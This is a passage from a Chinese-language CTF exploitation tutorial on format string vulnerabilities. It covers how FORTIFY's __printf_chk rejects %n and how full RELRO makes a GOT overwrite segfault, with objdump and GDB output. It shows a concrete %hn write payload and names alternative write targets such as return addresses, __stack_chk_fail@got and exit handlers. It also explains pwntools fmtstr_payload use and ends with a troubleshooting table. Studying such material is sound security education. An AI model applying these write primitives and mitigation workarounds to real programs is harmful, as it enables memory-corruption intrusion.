objdump -d -M intel p9_leak_o2 | grep -E 'call.*printf'    # gcc -O2 默认编译
objdump -d -M intel p9_leak_o2nofort | grep -E 'call.*printf'   # gcc -O2 -D_FORTIFY_SOURCE=0
```

输出：

```
    122b:	e8 a0 fe ff ff       	call   10d0 <__printf_chk@plt>
    1242:	e8 89 fe ff ff       	call   10d0 <__printf_chk@plt>
  401213:	e8 88 fe ff ff       	call   4010a0 <printf@plt>
  401225:	e8 76 fe ff ff       	call   4010a0 <printf@plt>
```

默认 `-O2` 产物里两次 `printf` 都换成了 `__printf_chk`；宏关掉后回到普通 `printf`。运行期的差别——对 `-O2` 版本发一发 `%n`：

```bash
./p9_leak_o2 < pay_n.txt; echo "exit code = $?"    # pay_n.txt 内容：'%n\n'
```

输出：

```
input> *** %n in writable segments detected ***
Aborted
exit code = 134
```

`%n` 还没来得及写，glibc 检查到"格式串在可写内存"直接 `abort`。==`%p`/`%s` 的读不受影响==：fortify 只封 `%n` 这一支，泄露类利用照做；写类利用要确认题目是 `-O0` 编译或未开 fortify（`readelf`/`objdump` 里没有 `__printf_chk` 即可）。

### 7.3 full RELRO：写只读页，死在 printf 里

给同一份 `p9_got.c` 加 `-Wl,-z,now` 链接成 full RELRO（两档 RELRO 的差别 [[P03-ELF链接与延迟绑定#3. RELRO：GOT 什么时候变只读|P3 第 3 节]]、[[P04-Linux安全缓解机制#6. RELRO：重定位区域只读|P4 第 6 节]]）：整张 GOT 启动后只读，`exit@got` 落在 GNU_RELRO 保护区 [0x403da0, 0x404000) 内。把 5.2 的 payload 对准它的新槽位 0x403fe8 发过去：

```bash
./p9_got_full < pay_full.bin; echo "exit code = $?"
```

输出：

```
input> Segmentation fault
exit code = 139
```

GDB 里看死在哪：

```
# gdb_full.cmds —— 跑法：gdb -q -batch -x gdb_full.cmds ./p9_got_full
set pagination off
set disassembly-flavor intel
run < pay_full.bin
info registers rip
bt
quit
```

输出（节选）：

```
Program received signal SIGSEGV, Segmentation fault.
printf_positional (buf=…, format=… "%64c%9$hn%4534c%10$hnaaa\352?@", …)
    at ./stdio-common/vfprintf-process-arg.c:358
#0  printf_positional (…) at ./stdio-common/vfprintf-process-arg.c:358
#1  __printf_buffer (…) at ./stdio-common/vfprintf-internal.c:1040
#2  __vfprintf_internal (…) at ./stdio-common/vfprintf-internal.c:1548
#3  __printf (…) at ./stdio-common/printf.c:33
#4  0x000000000040124a in vuln ()
#5  0x0000000000401278 in main ()
```

死点在 glibc 的 `printf` 内部处理 `%n` 那一行——写入只读页触发页错误。回溯里的 `#4 vuln`、`#5 main` 说明流程完全按预期走到了漏洞点，是写入目标本身不可写。注意 shell 输出里只有 `input> ` 一行：==`stdout` 无缓冲时 `printf` 把格式化结果攒在内部缓冲、整段处理完才写出，`%n` 中途崩掉，这一趟已"打印"的 64 个空格一并丢失==。==full RELRO 封掉的只是"写 GOT"这一个目标，漏洞本身、读类利用都还在==。写目标另选可写内存：

- ==栈上的返回地址==：泄露栈地址后把数值写回 `[rbp+8]`，效果同 [[P06-栈溢出原理与ret2win|P6]] 的覆盖，但不需要溢出；
- ==`__stack_chk_fail@got`==：把它改成无害函数的地址，Canary 检查失效——同样要求 Partial RELRO；
- ==`atexit`/退出处理结构==：`exit` 执行时会遍历 `__exit_funcs` 里的注册回调，向它写入可控指针也能劫持收尾流程（glibc 对其中的指针做了加密混淆，利用条件比 GOT 苛刻，知道有这条即可）。

对照成表：

| checksec 读到 | 格式化字符串还能做什么 |
| ---- | ---- |
| Partial RELRO | 泄露（`%p`/`%s`）+ 改写 GOT（本章主线） |
| Full RELRO | 泄露照常；写目标改栈上返回地址、函数指针、退出处理结构 |
| FORTIFY（`__printf_chk`） | `%p`/`%s` 照常；`%n` 被拒，写类路线换栈溢出等其他漏洞 |
| PIE 开 | 程序内地址先泄露基址再算（9.1 换算照用，槽位不变） |

## 8. 常见变体速览

- **循环里的 `printf(buf)`**：菜单型题目常把读入和 `printf(buf)` 套进 `while` 循环，一轮泄露、一轮写入在同一进程里完成。==注意 `%n` 的计数从进程第一字节输出起累计==：第二轮的写入 payload 要用 `fmtstr_payload(offset, writes, numbwritten=N)` 把前面已输出的 N 个字符计入起始计数，否则写入值整体偏小。3.2 的定点泄露在循环版里可以"先 `%p` 侦察一轮，再带偏移补一轮"，不用重启进程。
- **snprintf 二次格式化**：`snprintf(dst, size, src)` 把 `src` 当格式串格式化进 `dst`——题目常拿它当"过滤 `%p`"或限制长度的手段，比如先 `snprintf(buf2, 0x40, buf)` 只放行前 0x40 字节再 `printf(buf2)`。解法思路不变：==把要用的转换说明排进放行的窗口内==，写两段式 payload。
- **`%s` 的分寸**：`%s` 一次读"到 `\0` 为止"的一节，适合读字符串常量、密码串；读地址数据（GOT 里的二进制字节）又短又乱，不如 `%p` 直观。==泄露以 `%p` 为主、`%s` 点缀==，一发 payload 塞太多 `%s` 等于埋一串解引用地雷，槽位稍错进程就崩，前面的输出全作废。

## 9. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| `%p` 连打出一串 `0x70252d70252d7025` 一类的值 | 那是格式串自己的字节（`0x25` 是 `%`、`0x70` 是 `p`）在重复：buf 后续槽装的就是 `%p-%p-%p…` 的 ASCII。找到 6 号槽的 AAAA（2.2）即可定位 |
| `%N$p` 打出 `(nil)` | 那个槽的值是 0，glibc 对空指针的打印格式。换槽或确认目标算错没算对 |
| `%s` 一发就崩，什么都没泄 | 槽里是残留值或错位数据，被当指针解引用了（2.3 的 warning）。先 `%p` 看槽值，合法指针再 `%s` |
| `%n` 写完没反应，程序照常退出 | 计数值没算对或地址槽位错位：先单独发 `%N$p` 确认槽位里正好是目标地址（9.1 换算），再核对两次写入的计数和 |
| 发完 payload 程序直接 EOF | 地址字节撞上 0x0a 被 `gets` 截断（[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别\|P6 第 7 节]]），或 payload 超过 buf 把栈压坏——格式化字符串利用不需要溢出，payload 越短越好 |
| `fmtstr_payload` 生成的 payload 写到别处 | `offset` 不对：重新跑 AAAA 法定位；循环型程序还要带 `numbwritten`（第 8 节） |
| -O2 编译的题目 `%n` 无效，报 `%n in writable segments` | FORTIFY 在场，`__printf_chk` 拒绝了 `%n`（7.2）。泄露继续，写入换路线 |
| full RELRO 题改 GOT 崩在 printf | 写了只读页（7.3）：换栈上返回地址、函数指针等可写目标 |
| 32 位题 `%N$` 的编号和 64 位对不上 | cdecl 全栈传参、没有寄存器区，编号从栈上第一个字起（4.4）；AAAA 法重量 |
| 泄露的 libc 地址减偏移后低 12 位不是 0 | 收字节不全或偏移用了另一版 libc——核对与匹配的完整判据 [[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程\|P3 6.4]] |
